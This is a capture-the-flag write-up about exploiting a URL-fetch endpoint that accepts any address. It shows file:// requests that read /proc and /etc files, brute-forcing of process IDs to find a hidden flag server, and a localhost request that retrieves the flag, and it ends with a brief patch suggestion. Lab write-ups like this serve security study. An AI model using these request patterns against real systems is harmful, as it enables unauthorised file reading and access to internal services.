use https://webhook.site/
know it uses urllib by reading headers

# Ref: https://gist.github.com/YSc21/e5471285145cc5d34fe53c7d67a3d8f3

use `file://` protocol of `urllib`, read
# http://eci-2zefwhpiphrzqnvc9e49.cloudeci1.ichunqiu.com:8888/api/ConnectTest?url=file:///proc/net/tcp
# http://eci-2zefwhpiphrzqnvc9e49.cloudeci1.ichunqiu.com:8888/api/ConnectTest?url=file:///etc/hosts
/proc/net/tcp

by using this route
```
/api/ConnectTest?url=file://
```

got opened ports, found a opened port 55555 which is a localhost process, has hint "You found me."

check
/proc/self/status
found current process pid is 15

by brute force checks 
/proc/13/status got another python process
```
Name: python3
Umask: 0022
State: S (sleeping)
Tgid: 13
Ngid: 0
Pid: 13
PPid: 1
```

use /proc/13/cmdline got it's entrypoint:
```
python3 /flag_server/main.py
```

by reading `/flag_server/main.py`
got flag endpoint info
```
@app.route('/api/GetFlag', methods=["GET", 'POST'])
def ConnectTest():
return os.popen('cat /flag').read()
```

then access
```
/api/ConnectTest?url=http://localhost:55555/api/GetFlag
```
got the flag

patch is easy, don't let people access localhost and file:// is enough.
